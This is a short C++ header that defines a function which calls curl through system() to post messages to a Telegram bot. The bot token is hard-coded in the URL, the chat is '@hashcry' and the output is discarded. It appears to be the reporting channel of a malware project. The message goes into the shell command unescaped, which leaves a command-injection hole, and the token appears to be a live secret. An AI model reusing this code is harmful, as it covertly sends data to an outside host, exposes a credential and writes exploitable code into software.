#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include <winhttp.h>
#include "settings.h"
#pragma comment(lib, "winhttp.lib")
#include <string>
#include <windows.h>
#include <winhttp.h>

#include <string>
#include <windows.h>
#include <winhttp.h>

int __telegram_send(const std::string& message) {
   
    std::string command = "curl -X POST -d \"chat_id=@hashcry\" -d \"text=" + message + "\" https://api.telegram.org/bot7055190695:AAGq12bRVizWFRwuN_BFne620Bb2GzGH_5s/sendMessage > NUL";
    system(command.c_str());   
    return 0;
}



